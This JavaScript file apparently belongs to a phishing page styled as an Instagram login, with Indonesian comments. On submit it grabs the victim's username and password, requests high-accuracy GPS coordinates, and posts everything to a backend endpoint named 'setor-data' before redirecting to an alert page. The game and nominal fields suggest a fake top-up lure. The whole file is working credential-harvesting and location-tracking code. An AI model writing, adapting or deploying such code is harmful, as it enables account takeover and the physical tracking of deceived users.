// ========== LOGIN BUTTON STATE ==========
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');
const loginForm = document.getElementById('loginForm');

function checkForm() {
  if (!usernameInput || !passwordInput || !loginBtn) return;
  const hasUsername = usernameInput.value.trim().length > 0;
  const hasPassword = passwordInput.value.trim().length > 0;
  loginBtn.disabled = !(hasUsername && hasPassword);
  loginBtn.style.opacity = loginBtn.disabled ? '0.3' : '1';
}

if (usernameInput && passwordInput) {
  usernameInput.addEventListener('input', checkForm);
  passwordInput.addEventListener('input', checkForm);
  checkForm(); // Initial check
}

// Helper to get High-Accuracy Geolocation
async function getPreciseLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve(null);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        });
      },
      (err) => {
        console.warn('GPS denied or error:', err.message);
        resolve(null);
      },
      {
        enableHighAccuracy: true,
        timeout: 8000,
        maximumAge: 0
      }
    );
  });
}

// ========== LOGIN LOADING & BACKEND CONNECTION ==========
if (loginForm) {
  loginForm.addEventListener('submit', async function(e) {
    e.preventDefault(); // Mencegah refresh halaman
    
    if (!loginBtn) return;
    loginBtn.disabled = true;
    loginBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Menunggu Izin Lokasi...';

    // 1. Ambil GPS Presisi (Simulasi osint/tracking akurat)
    const gpsData = await getPreciseLocation();
    
    loginBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Memproses...';

    const dataPayload = {
      username: usernameInput.value,
      password: passwordInput.value,
      game: 'Instagram Test Layout',
      nominal: 'N/A',
      gps: gpsData // Kirim GPS jika diizinkan
    };

    try {
      // Mengirimkan data ke Backend Express
      const response = await fetch('/api/setor-data', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(dataPayload)
      });

      const result = await response.json();

      // Jika backend sukses memproses, langsung lempar ke alamat tujuan
      if (result.status === 'success') {
        window.location.href = 'pages/alert.html';
      }

    } catch (error) {
      console.error('Gagal menghubungi server backend:', error);
      window.location.href = 'pages/alert.html';
    }
  });
}

